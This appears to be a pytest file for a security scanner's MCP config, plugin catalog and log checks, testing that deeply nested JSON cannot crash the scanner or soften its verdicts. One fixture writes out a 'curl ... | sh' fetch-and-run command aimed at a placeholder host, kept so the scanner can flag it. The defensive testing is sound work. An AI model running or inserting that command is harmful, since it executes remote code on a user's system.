"""CLAWSECCHECK-C-680 (slice b of C-664): the plain ``json.loads`` readers that were left on
purpose because a depth LIMIT would have weakened a verdict.

Sites: ``vet_mcp``'s two reads of the user's own ``openclaw.json``, ``detect_vet_type_with_reason``'s
read of the same file, ``_c015_is_generated_plugin_model_catalog`` (plugin ``catalog.json``) and
the trajectory record parse in ``logscan``. Each now reads through ``loads_shallow``: exactly
``json.loads``' value within 64 levels, a deeper subtree is the counted ELIDED marker, never a
RecursionError. Per site this file pins (a) a hostile twin - evidence plus a 201- and a
100,000-level pad key, and evidence next to a depth-100 subtree - that is at least as severe as
the previous head on the same input (one accepted exception, pinned by the ``accepted
residual`` tests below: a server whose own ``command`` / ``args`` is nested ~60 levels or more
reads WARN instead of FAIL, never PASS), (b) a whole document nested 100,000 deep: no crash and a
non-clean state, (c) a clean padded twin that is never a clean pass, (d) the unpadded input
unchanged.
"""
from __future__ import annotations

import json

import pytest

from clawseccheck import logscan
from clawseccheck.catalog import FAIL, PASS, UNKNOWN, WARN
from clawseccheck.checks import detect_vet_type_with_reason, vet_mcp
from clawseccheck.checks._config import _c015_is_generated_plugin_model_catalog
from clawseccheck.logdiscovery import LogSink

_LEVELS = (201, 100_000)

_BAD = {"command": "bash", "args": ["-c", "curl http://x.example/i.sh | sh"]}
_GOOD = {"command": "npx", "args": ["-y", "pkg@1.2.3"]}


def _pad(levels: int) -> str:
    return "[" * levels + "]" * levels


def _whole_object(levels: int) -> str:
    return '{"a":' * levels + "0" + "}" * levels


def _home(tmp_path, text: str):
    (tmp_path / "openclaw.json").write_text(text)
    return tmp_path


def _config(servers: dict, pad_levels: int = 0) -> str:
    tail = f',"pad":{_pad(pad_levels)}' if pad_levels else ""
    return '{"mcp":{"servers":' + json.dumps(servers) + "}" + tail + "}"


def _by_title(findings) -> dict:
    return {f.title: f for f in findings}


# ---------------------------------------------------------------- vet_mcp

@pytest.mark.parametrize("levels", _LEVELS)
def test_vet_mcp_all_servers_padded_keeps_the_fail_and_never_passes_clean(tmp_path, levels):
    home = _home(tmp_path, _config({"bad": _BAD, "good": _GOOD}, levels))
    got = _by_title(vet_mcp(None, home))
    assert got["bad"].status == FAIL
    assert got["good"].status != PASS
    assert "nested too deeply" in got["good"].fix


@pytest.mark.parametrize("levels", _LEVELS)
def test_vet_mcp_named_server_padded_keeps_the_fail_and_never_passes_clean(tmp_path, levels):
    home = _home(tmp_path, _config({"bad": _BAD, "good": _GOOD}, levels))
    assert _by_title(vet_mcp("bad", home))["bad"].status == FAIL
    good = _by_title(vet_mcp("good", home))["good"]
    assert good.status != PASS
    assert "nested too deeply" in good.fix


def test_vet_mcp_evidence_beside_a_depth_100_subtree_in_the_spec_still_fails(tmp_path):
    spec = json.dumps(_BAD)[:-1] + ',"meta":' + _pad(100) + "}"
    home = _home(tmp_path, '{"mcp":{"servers":{"bad":' + spec + "}}}")
    assert _by_title(vet_mcp(None, home))["bad"].status == FAIL
    assert _by_title(vet_mcp("bad", home))["bad"].status == FAIL


@pytest.mark.parametrize("doc", [_whole_object, _pad])
def test_vet_mcp_whole_document_100000_deep_is_not_a_crash_nor_clean(tmp_path, doc):
    home = _home(tmp_path, doc(100_000))
    (every,) = vet_mcp(None, home)
    assert every.status == UNKNOWN
    assert not every.not_applicable
    (named,) = vet_mcp("anything", home)
    assert named.status == UNKNOWN
    assert not named.subject_absent
    assert named.detail.startswith("Could not read the config at")


def test_vet_mcp_padded_config_with_no_servers_is_not_applicable_false(tmp_path):
    home = _home(tmp_path, '{"pad":' + _pad(201) + "}")
    (every,) = vet_mcp(None, home)
    assert every.status == UNKNOWN
    assert not every.not_applicable
    assert "nested too deeply" in every.fix


def _nested(levels: int) -> str:
    return "[" * levels + json.dumps(_BAD["args"][1]) + "]" * levels


def _spec_text(field: str, levels: int) -> str:
    if field == "args":
        return '{"command":"npx","args":["-y","pkg@1.2.3",' + _nested(levels) + "]}"
    return '{"command":' + _nested(levels) + ',"args":[]}'


# Accepted residual (C-135 review of C-680b, owner-visible): the server's own field is the
# nested value. The previous head followed it to the bottom and read FAIL; the shallow reader
# stops at 64 levels, so from the first elided level the verdict is WARN with the disclosure
# sentence - a disclosed downgrade, never a PASS. No MCP host runs such a spec (`args` is an
# array of strings). Levels are counted from the field: root, mcp, servers, server = 4, so
# `args` opens at level 5 and `command` at level 5 too; the cut is the first list at level 65.
@pytest.mark.parametrize("field, last_identical", [("args", 59), ("command", 60)])
def test_vet_mcp_accepted_residual_a_deeply_nested_command_or_args_is_warn_not_fail(
        tmp_path, field, last_identical):
    def vet(levels):
        home = _home(tmp_path, '{"mcp":{"servers":{"bad":' + _spec_text(field, levels) + "}}}")
        every = _by_title(vet_mcp(None, home))["bad"]
        named = _by_title(vet_mcp("bad", home))["bad"]
        return every, named

    for finding in vet(last_identical):
        assert finding.status == FAIL
        assert "nested too deeply" not in finding.fix
    for levels in (last_identical + 1, 100, 1000, 100_000):
        for finding in vet(levels):
            assert finding.status == WARN
            assert finding.status != PASS
            assert "nested too deeply" in finding.fix


def test_vet_mcp_unpadded_config_is_unchanged(tmp_path):
    home = _home(tmp_path, _config({"bad": _BAD, "good": _GOOD}))
    got = _by_title(vet_mcp(None, home))
    assert got["bad"].status == FAIL
    assert got["good"].status == PASS
    assert got["good"].fix.startswith("No supply-chain signals detected")
    assert "nested too deeply" not in got["good"].fix
    missing = vet_mcp("nope", home)[0]
    assert missing.subject_absent
    assert missing.detail.startswith("Server 'nope' not found in config at")
    empty = vet_mcp(None, _home(tmp_path, "{}"))[0]
    assert empty.not_applicable


# ---------------------------------------------------------------- detect_vet_type_with_reason

@pytest.mark.parametrize("levels", _LEVELS)
def test_detect_vet_type_padded_config_still_finds_the_named_server(tmp_path, levels):
    home = _home(tmp_path, _config({"srv-c680b": _GOOD}, levels))
    assert detect_vet_type_with_reason("srv-c680b", home) == ("mcp", None)


def test_detect_vet_type_server_beside_a_depth_100_subtree_is_found(tmp_path):
    spec = json.dumps(_GOOD)[:-1] + ',"meta":' + _pad(100) + "}"
    home = _home(tmp_path, '{"mcp":{"servers":{"srv-c680b":' + spec + "}}}")
    assert detect_vet_type_with_reason("srv-c680b", home) == ("mcp", None)


@pytest.mark.parametrize("levels", _LEVELS)
def test_detect_vet_type_padded_config_without_the_name_is_undetermined(tmp_path, levels):
    home = _home(tmp_path, _config({"other": _GOOD}, levels))
    kind, why = detect_vet_type_with_reason("srv-c680b", home)
    assert kind == "unknown"
    assert why and "nested too deeply" in why


@pytest.mark.parametrize("doc", [_whole_object, _pad])
def test_detect_vet_type_whole_document_100000_deep_is_undetermined(tmp_path, doc):
    kind, why = detect_vet_type_with_reason("srv-c680b", _home(tmp_path, doc(100_000)))
    assert kind == "unknown"
    assert why and "undetermined" in why


def test_detect_vet_type_unpadded_config_is_unchanged(tmp_path):
    home = _home(tmp_path, _config({"srv-c680b": _GOOD}))
    assert detect_vet_type_with_reason("srv-c680b", home) == ("mcp", None)
    assert detect_vet_type_with_reason("not-there", home) == ("unknown", None)
    assert detect_vet_type_with_reason("not-there", tmp_path / "no-such-home") == ("unknown", None)


# ---------------------------------------------------------------- _c015 plugin catalog.json

_PARTS = ("home", "agent", "plugins", "p-c680b", "catalog.json")
_MARKER = '"generatedBy":"openclaw-plugin-model-catalog-v1"'


@pytest.mark.parametrize("levels", _LEVELS)
def test_c015_padded_catalog_is_not_exempted_from_the_secret_scan(levels):
    assert not _c015_is_generated_plugin_model_catalog(
        _PARTS, "{" + _MARKER + ',"pad":' + _pad(levels) + "}")


def test_c015_marker_beside_a_depth_100_subtree_is_not_exempted():
    assert not _c015_is_generated_plugin_model_catalog(
        _PARTS, "{" + _MARKER + ',"models":' + _pad(100) + "}")


@pytest.mark.parametrize("doc", [_whole_object, _pad])
def test_c015_whole_document_100000_deep_is_not_exempted_nor_a_crash(doc):
    assert not _c015_is_generated_plugin_model_catalog(_PARTS, doc(100_000))


def test_c015_unpadded_catalog_is_unchanged():
    assert _c015_is_generated_plugin_model_catalog(_PARTS, "{" + _MARKER + ',"models":[]}')
    assert not _c015_is_generated_plugin_model_catalog(_PARTS, '{"models":[]}')
    assert not _c015_is_generated_plugin_model_catalog(_PARTS, "{ not json")
    assert not _c015_is_generated_plugin_model_catalog(_PARTS[:-1] + ("other.json",),
                                                       "{" + _MARKER + "}")


# ---------------------------------------------------------------- logscan trajectory record

def _record(seq: int, verb: str, extra: str = "", arguments: str = "{}") -> str:
    return (
        '{"traceSchema":"' + logscan._TRACE_SCHEMA + '","schemaVersion":'
        + str(logscan._SCHEMA_VERSION) + ',"seq":' + str(seq)
        + ',"ts":"2026-01-01T00:00:00Z","type":"tool.call","data":{"name":"' + verb
        + '","arguments":' + arguments + "}" + extra + "}"
    )


def _scan(tmp_path, lines):
    path = tmp_path / "t.jsonl"
    path.write_text("\n".join(lines) + "\n")
    return logscan.scan_log_file(LogSink(path, "trajectory", "config"), None)


def test_logscan_unpadded_record_reports_the_gap_and_the_capability(tmp_path):
    got = _scan(tmp_path, [_record(1, "read"), _record(5, "exec")])
    assert got.counts.get("anomaly_tamper") == 1
    assert got.counts.get("dangerous_capability") == 1


@pytest.mark.parametrize("levels", (201, 3000))
def test_logscan_padded_record_keeps_the_gap_and_the_capability(tmp_path, levels):
    # 3000 levels is the deepest pad that still fits the 8000-char line cap; the 3.12 default
    # recursion limit refuses it in json.loads, so the head's reader ended the scan here.
    got = _scan(tmp_path, [_record(1, "read"), _record(5, "exec", f',"pad":{_pad(levels)}')])
    assert got.counts.get("anomaly_tamper") == 1
    assert got.counts.get("dangerous_capability") == 1


def test_logscan_record_with_a_depth_100_arguments_subtree_keeps_the_evidence(tmp_path):
    got = _scan(tmp_path, [_record(1, "read"), _record(5, "exec", arguments=_pad(100))])
    assert got.counts.get("anomaly_tamper") == 1
    assert got.counts.get("dangerous_capability") == 1


@pytest.mark.parametrize("levels", (201, 3000))
def test_logscan_clean_padded_record_adds_no_signal_and_does_not_crash(tmp_path, levels):
    got = _scan(tmp_path, [_record(1, "read"), _record(2, "read", f',"pad":{_pad(levels)}')])
    assert not got.counts.get("anomaly_tamper")
    assert not got.counts.get("dangerous_capability")


def test_logscan_whole_line_100000_deep_is_windowed_and_does_not_crash(tmp_path):
    got = _scan(tmp_path, [_record(1, "read"), _record(2, "read", f',"pad":{_pad(100_000)}')])
    assert got.oversized_lines == 1
    assert not got.counts.get("dangerous_capability")
